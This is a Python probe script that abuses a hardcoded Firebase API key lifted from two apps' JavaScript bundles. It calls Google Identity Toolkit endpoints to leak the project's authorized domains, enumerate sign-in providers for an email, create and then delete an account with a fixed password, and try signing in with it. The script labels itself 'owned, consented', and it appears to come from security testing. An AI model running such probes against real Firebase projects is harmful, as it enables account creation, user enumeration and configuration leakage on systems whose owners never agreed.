#!/usr/bin/env python3
"""Firebase API key abuse probe — owned, consented (ownership).

The key AIzaSyB-wn4pMXrk7GpnTKEUELY290qpQ0kIQgI is hardcoded in both
git-vizor and database-tulia JS bundles. Tests:

  1. createAuthUri  — confirm the Firebase project exists
  2. signUp         — write-verification: create a SECPROBE account, then
                      immediately delete it (cleanup-first)
  3. lookup         — enumerate providers for a known email
  4. getProjectConfig — leak the project's authorized domains
"""
import asyncio
import json
from pathlib import Path

import aiohttp

API_KEY = "AIzaSyB-wn4pMXrk7GpnTKEUELY290qpQ0kIQgI"
ITKIT = "https://identitytoolkit.googleapis.com/v1"
MARKER = "titan.seprobe.x9z2k7"


async def probe():
    results = {"key": API_KEY, "tests": {}}
    async with aiohttp.ClientSession() as s:
        # 1. getProjectConfig — leaks authorized domains
        try:
            async with s.get(f"{ITKIT}/projects?key={API_KEY}", timeout=15) as r:
                text = await r.text()
                results["tests"]["getProjectConfig_v1"] = {
                    "status": r.status, "body": text[:800]
                }
        except Exception as e:
            results["tests"]["getProjectConfig_v1"] = {"error": str(e)}

        try:
            url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/getProjectConfig?key={API_KEY}"
            async with s.get(url, timeout=15) as r:
                text = await r.text()
                results["tests"]["getProjectConfig"] = {
                    "status": r.status, "body": text[:1200]
                }
        except Exception as e:
            results["tests"]["getProjectConfig"] = {"error": str(e)}

        # 2. createAuthUri — confirm project, enumerate providers
        try:
            payload = {
                "identifier": "test@example.com",
                "continueUri": "http://localhost",
            }
            url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/createAuthUri?key=" + API_KEY
            async with s.post(url, json=payload, timeout=15) as r:
                text = await r.text()
                results["tests"]["createAuthUri"] = {
                    "status": r.status, "body": text[:800]
                }
        except Exception as e:
            results["tests"]["createAuthUri"] = {"error": str(e)}

        # 3. signUp — write-verification with SECPROBE marker + immediate cleanup
        id_token = None
        try:
            payload = {
                "email": f"{MARKER}@example.com",
                "password": "T1tanProbe!Pwn",
                "returnSecureToken": True,
            }
            url = f"{ITKIT}/accounts:signUp?key={API_KEY}"
            async with s.post(url, json=payload, timeout=15) as r:
                text = await r.text()
                try:
                    body = json.loads(text)
                except Exception:
                    body = {}
                id_token = body.get("idToken")
                results["tests"]["signUp"] = {
                    "status": r.status,
                    "created": bool(body.get("localId")),
                    "localId": body.get("localId"),
                    "email": body.get("email"),
                    "body": text[:600],
                }
        except Exception as e:
            results["tests"]["signUp"] = {"error": str(e)}

        # 4. cleanup — delete the SECPROBE account
        if id_token:
            try:
                url = f"{ITKIT}/accounts:delete?key={API_KEY}"
                async with s.post(url, json={"idToken": id_token}, timeout=15) as r:
                    results["tests"]["cleanup_delete"] = {
                        "status": r.status, "cleaned": r.status == 200
                    }
            except Exception as e:
                results["tests"]["cleanup_delete"] = {"error": str(e)}
        else:
            results["tests"]["cleanup_delete"] = {"skipped": "no idToken"}

        # 5. signInWithPassword — confirm the account (if it survived)
        try:
            payload = {
                "email": f"{MARKER}@example.com",
                "password": "T1tanProbe!Pwn",
                "returnSecureToken": True,
            }
            url = f"{ITKIT}/accounts:signInWithPassword?key={API_KEY}"
            async with s.post(url, json=payload, timeout=15) as r:
                text = await r.text()
                results["tests"]["signInWithPassword"] = {
                    "status": r.status, "body": text[:400]
                }
        except Exception as e:
            results["tests"]["signInWithPassword"] = {"error": str(e)}

    return results


async def main():
    print("=" * 70)
    print("FIREBASE KEY PROBE — owned, consented")
    print("=" * 70)
    out = await probe()
    for name, t in out["tests"].items():
        print(f"\n[{name}]")
        print(json.dumps(t, indent=2)[:600])
    p = Path("findings/FIREBASE-PROBE.json")
    p.write_text(json.dumps(out, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"\n[+] written to {p}")


if __name__ == "__main__":
    asyncio.run(main())
